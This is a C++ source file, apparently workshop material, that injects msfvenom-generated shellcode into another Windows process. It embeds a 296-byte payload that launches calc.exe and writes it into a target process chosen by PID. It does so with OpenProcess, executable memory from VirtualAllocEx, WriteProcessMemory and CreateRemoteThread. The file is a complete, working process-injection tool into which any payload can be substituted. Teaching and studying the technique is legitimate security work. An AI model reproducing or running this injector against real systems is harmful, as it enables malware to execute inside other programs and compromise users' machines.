#include <iostream>
#include <Windows.h>

    // msfvenom calc shellcode
    // msfvenom -p windows/x64/exec CMD=calc.exe -f c 
    // we are defining the shellcode here globally; but you can also just define it in a function
    unsigned char calcshellcode[296] = { 
        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
        0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
        0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
        0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
        0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
        0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
        0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
        0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
        0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
        0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
        0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,
        0x77,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x73,0x79,0x73,0x74,0x65,0x6d,0x33,
        0x32,0x5c,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x0 };

BOOL inject(DWORD pid)
{
    //get a handle to the process you wish to inject into, there are ways to get the process ID programatically, but this is out of scope for this workshop
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    BOOL success = FALSE;

    //check if handle is valid, if not we wont be able to inject so no use in going further
    if (!pHandle)
    {
        return FALSE;
    }

    //alocate virtual memory to the remote process
   LPVOID remoteVirtualAddressLocation =  VirtualAllocEx(pHandle, NULL, sizeof(calcshellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

   //check if we got a valid remotememoryallocation pointer back, if not return false.
   if (remoteVirtualAddressLocation)
   {
       //we were able to write new virtual memory in the remote process, we can write to this location now.
       SIZE_T byteswritten = 0;
       BOOL writesuccess = WriteProcessMemory(pHandle, remoteVirtualAddressLocation, calcshellcode, sizeof(calcshellcode), &byteswritten);
       if (writesuccess)
       {
           HANDLE hThread = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteVirtualAddressLocation, NULL, 0, NULL);
           if (hThread)
           {
               return TRUE;
           }
           return FALSE;
       }
       //if the shellcode could not be written, we return FALSE
       return success;
   }
   return success;
}

int main()
{
    //change the pid here to a process that actually is running on your system :)
    inject(14764);
    
}


